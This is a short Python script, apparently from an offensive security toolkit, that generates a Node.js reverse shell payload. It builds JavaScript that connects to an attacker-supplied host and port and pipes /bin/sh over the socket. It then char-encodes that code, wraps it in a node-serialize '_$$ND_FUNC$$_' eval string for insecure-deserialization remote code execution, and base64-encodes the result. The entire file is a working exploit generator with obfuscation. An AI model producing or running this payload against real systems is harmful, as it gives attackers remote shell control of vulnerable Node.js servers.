#!/usr/bin/python
#
# JYCSEC NodeJS Reverse Shell
#
# Based on ajinabraham's code -------------------------------------------------
# https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py
# Insecurety Research (2013) - insecurety.net
#------------------------------------------------------------------------------
import sys
import base64

if len(sys.argv) != 3:
    print "Usage: %s <LHOST> <LPORT>" % (sys.argv[0])
    sys.exit(0)

IP_ADDR = sys.argv[1]
PORT = sys.argv[2]


def charencode(string):
    """String.CharCode"""
    encoded = ''
    for char in string:
        encoded = encoded + "," + str(ord(char))
    return encoded[1:]

print "[+] LHOST = %s" % (IP_ADDR)
print "[+] LPORT = %s" % (PORT)
NODEJS_REV_SHELL = '''
var net = require('net');
var spawn = require('child_process').spawn;
HOST="%s";
PORT="%s";
TIMEOUT="5000";
if (typeof String.prototype.contains === 'undefined') { String.prototype.contains = function(it) { return this.indexOf(it) != -1; }; }
function c(HOST,PORT) {
    var client = new net.Socket();
    client.connect(PORT, HOST, function() {
        var sh = spawn('/bin/sh',[]);
        client.write("Connected!\\n");
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
        sh.on('exit',function(code,signal){
          client.end("Disconnected!\\n");
        });
    });
    client.on('error', function(e) {
        setTimeout(c(HOST,PORT), TIMEOUT);
    });
}
c(HOST,PORT);
''' % (IP_ADDR, PORT)
print "[+] Encoded"
PAYLOAD = charencode(NODEJS_REV_SHELL)
PAYLOAD_Final = "{\"rce\":\"_$$ND_FUNC$$_function (){eval(String.fromCharCode(%s))" % (PAYLOAD) + "}()\"}"
print PAYLOAD_Final + "=="
PAYLOAD_Encoded = base64.b64encode(PAYLOAD_Final)
print "[+] B64 Encoded"
print PAYLOAD_Encoded + "%3D%3D"
